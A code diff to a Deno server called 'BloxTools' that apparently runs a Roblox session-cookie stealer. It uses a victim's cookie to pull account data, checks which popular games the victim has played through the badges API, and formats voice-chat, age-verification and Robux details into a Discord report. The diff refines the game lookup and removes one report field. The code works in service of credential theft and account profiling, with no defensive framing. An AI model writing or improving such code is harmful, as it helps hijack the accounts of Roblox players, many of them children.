@@ -27,12 +27,22 @@ const SITE_NAME = "BloxTools";
 const KORBLOX_BUNDLE_ID = 192;     // Korblox Deathspeaker
 const HEADLESS_BUNDLE_ID = 201;    // Headless Horseman
 
-// Tracked game universe IDs — checked to see if the cookie owner has played
-const TRACKED_GAMES: Array<{ name: string; universeId: number }> = [
-  { name: "MM2", universeId: 142823291 },
-  { name: "Steal a Brainrot", universeId: 109983668079237 },
-  { name: "Adopt Me", universeId: 920587237 },
+// Tracked games — values are Roblox PLACE IDs (resolved to universe IDs at runtime)
+const TRACKED_GAMES: Array<{ name: string; placeId: number }> = [
+  { name: "MM2", placeId: 142823291 },
+  { name: "Steal a Brainrot", placeId: 109983668079237 },
+  { name: "Adopt Me", placeId: 920587237 },
 ];
+
+// Resolve a place ID to its universe ID via Roblox's apis endpoint
+async function placeToUniverse(placeId: number): Promise<number | null> {
+  try {
+    const r = await fetch(`https://apis.roblox.com/universes/v1/places/${placeId}/universe`);
+    if (!r.ok) return null;
+    const j = await r.json() as { universeId?: number };
+    return j.universeId ?? null;
+  } catch { return null; }
+}
 
 Deno.serve(async (req) => {
   if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
@@ -257,8 +267,12 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
 // "welcome" / join badge, so this is a reliable proxy for "has played".
 async function fetchPlayedGames(userId: number): Promise<Array<{ name: string; played: boolean }>> {
   return await Promise.all(
-    TRACKED_GAMES.map(async ({ name, universeId }) => {
+    TRACKED_GAMES.map(async ({ name, placeId }) => {
       try {
+        // Place ID → Universe ID (badges API requires universe IDs)
+        const universeId = await placeToUniverse(placeId);
+        if (!universeId) return { name, played: false };
+
         // Get a handful of badges from the universe
         const badgesRes = await fetch(
           `https://badges.roblox.com/v1/universes/${universeId}/badges?limit=25&sortOrder=Asc`,
@@ -512,7 +526,6 @@ function buildDiscordPayload(opts: {
       { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
       { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
       { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
-      { name: "💳 Total Robux Spent", value: `${(roblox.robuxSpent ?? 0).toLocaleString()} R$`, inline: true },
       { name: "📊 Lifetime Summary", value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()} R$`, inline: true },
     );
 
